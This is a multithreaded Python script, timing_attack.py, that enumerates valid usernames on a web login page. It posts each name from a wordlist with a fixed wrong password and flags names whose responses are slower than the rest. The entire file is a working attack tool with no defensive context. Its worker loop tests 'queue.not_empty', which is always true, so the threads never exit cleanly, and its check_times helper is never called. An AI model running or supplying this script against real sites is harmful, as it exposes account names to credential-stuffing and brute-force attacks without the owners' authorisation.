#!/usr/bin/python3

import requests
import sys
import time
from queue import Queue
import threading

try:
    url = sys.argv[1]
    username_list = sys.argv[2]
    threads = int(sys.argv[3])
except:
    print('Usage: ./timing_attack.py [url] [username_list] [threads]')
    sys.exit()


def login(username, url):
    """
    This function tries to send a POST request for a login page.
    :param username: username to send
    :param url: url of login page
    :return: None
    """

    creds = {"username": username, "password": "invalidPassword!"}
    requests.post(url, json=creds)


def fill_queue(my_list: list, my_queue: Queue):
    """
    This function receives a list and a queue and fills the queue with the list.
    :param my_list: List to fill the queue, the strip() removes spaces before and after the word and line breaks
    :param my_queue: Queue object
    """

    for l in my_list:
        my_queue.put(l.strip())


def attack():
    global queue
    global url
    global time_dict

    while queue.not_empty:
        user = queue.get()
        start = time.time()
        login(user, url)
        end = time.time()
        total = end - start
        time_dict[user] = total

        if total > 1.5:	# This needs to be modified according to the response time or use the function check_times
        	print(user, total)


def main(function, threads, thread_list):
    """
    Executes a function with multi threading.
    :param function: function to be executed
    :param threads: number of threads to execute the function
    :param thread_list: control list to save the threads during execution
    """

    for i in range(threads):
        thread = threading.Thread(target=function)  # tells the thread what function to execute
        thread_list.append(thread)

    # The following 2 for need to be separate, otherwise only 1 thread will be launched in the beginning
    for thread in thread_list:
        thread.start()

    for thread in thread_list:
        thread.join()  # waits for all threads to finish


def check_times():
    global time_dict

    local_dict = time_dict.copy()
    time_dict.clear()
    max_param = max(local_dict.values())

    for k, v in local_dict.items():
        if v > 0.91 * max_param:
            print(k, v)


queue = Queue()
thread_list = []
time_dict = {}

with open(username_list, 'r') as my_file:
    usernames = my_file.readlines()
    fill_queue(usernames, queue)

if __name__ == '__main__':
    main(attack, threads, thread_list)
